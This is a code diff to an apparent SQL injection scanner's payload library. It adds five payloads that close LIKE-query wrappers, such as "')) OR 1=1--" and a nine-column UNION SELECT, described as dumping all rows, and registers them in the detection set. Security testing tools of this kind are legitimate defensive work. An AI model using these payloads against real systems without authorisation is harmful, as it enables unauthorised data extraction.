@@ -130,6 +130,79 @@ const errorBasedPayloads: Payload[] = [
   },
 ];
 
+/**
+ * LIKE-context payloads — close the common `LIKE '%input%'))` wrapping
+ * before injecting. Many real-world apps (search forms, filters) use LIKE
+ * queries; standard payloads fail because the quotes/parens don't match.
+ */
+const likeContextPayloads: Payload[] = [
+  {
+    id: generatePayloadId("sqli", "error_based", 8),
+    category: "sqli",
+    technique: "error_based",
+    riskLevel: "safe",
+    value: "')) OR 1=1--",
+    description: "Close LIKE with double-paren + OR true — dumps all rows",
+    expectedBehavior: "Full data dump (response much larger than baseline)",
+    successIndicators: [],
+    failureIndicators: [],
+    applicableContexts: ["url_param", "body_param"],
+    encoding: "none",
+  },
+  {
+    id: generatePayloadId("sqli", "error_based", 9),
+    category: "sqli",
+    technique: "error_based",
+    riskLevel: "safe",
+    value: "') OR 1=1--",
+    description: "Close LIKE with single-paren + OR true",
+    expectedBehavior: "Full data dump",
+    successIndicators: [],
+    failureIndicators: [],
+    applicableContexts: ["url_param", "body_param"],
+    encoding: "none",
+  },
+  {
+    id: generatePayloadId("sqli", "error_based", 10),
+    category: "sqli",
+    technique: "error_based",
+    riskLevel: "safe",
+    value: "%')) OR 1=1--",
+    description: "Close LIKE wildcard + double-paren + OR true",
+    expectedBehavior: "Full data dump",
+    successIndicators: [],
+    failureIndicators: [],
+    applicableContexts: ["url_param", "body_param"],
+    encoding: "none",
+  },
+  {
+    id: generatePayloadId("sqli", "error_based", 11),
+    category: "sqli",
+    technique: "error_based",
+    riskLevel: "safe",
+    value: "')) OR TRUE--",
+    description: "Close LIKE with double-paren + OR TRUE (SQLite/Postgres friendly)",
+    expectedBehavior: "Full data dump",
+    successIndicators: [],
+    failureIndicators: [],
+    applicableContexts: ["url_param", "body_param"],
+    encoding: "none",
+  },
+  {
+    id: generatePayloadId("sqli", "error_based", 12),
+    category: "sqli",
+    technique: "error_based",
+    riskLevel: "safe",
+    value: "')) UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--",
+    description: "Close LIKE + UNION SELECT 9 columns (common table width)",
+    expectedBehavior: "Extra row or column mismatch error",
+    successIndicators: ["null", "UNION", "column"],
+    failureIndicators: [],
+    applicableContexts: ["url_param", "body_param"],
+    encoding: "none",
+  },
+];
+
 const timeBasedPayloads: Payload[] = [
   {
     id: generatePayloadId("sqli", "time_based", 1),
@@ -305,6 +378,7 @@ export const sqliPayloadSet: PayloadSet = {
   description: "Comprehensive SQL injection test payloads for error-based, time-based, boolean-based, and union-based detection",
   payloads: [
     ...errorBasedPayloads,
+    ...likeContextPayloads,
     ...timeBasedPayloads,
     ...booleanBasedPayloads,
     ...unionBasedPayloads,
